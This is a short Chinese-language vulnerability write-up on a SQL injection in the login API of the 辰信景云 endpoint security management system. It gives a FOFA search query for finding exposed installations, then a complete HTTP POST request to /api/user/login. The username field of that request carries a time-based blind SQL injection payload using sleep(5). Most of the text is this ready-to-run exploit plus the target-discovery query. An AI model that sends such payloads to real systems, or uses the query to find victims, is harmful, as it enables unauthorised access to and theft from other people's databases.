# 辰信景云终端安全管理系统login  SQL注入漏洞 

## 1.漏洞描述

辰信景云终端安全管理系统 login 存在 SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 2.搜索语法

```plain
fofa："辰信景云终端安全管理系统" && icon_hash="-429260979"
```

## 3.漏洞复现

```plain
POST /api/user/login HTTP/2
Host: 127.0.0.1
Content-Length: 102
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='
```

![image-20240618185509099](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240618185509099.png)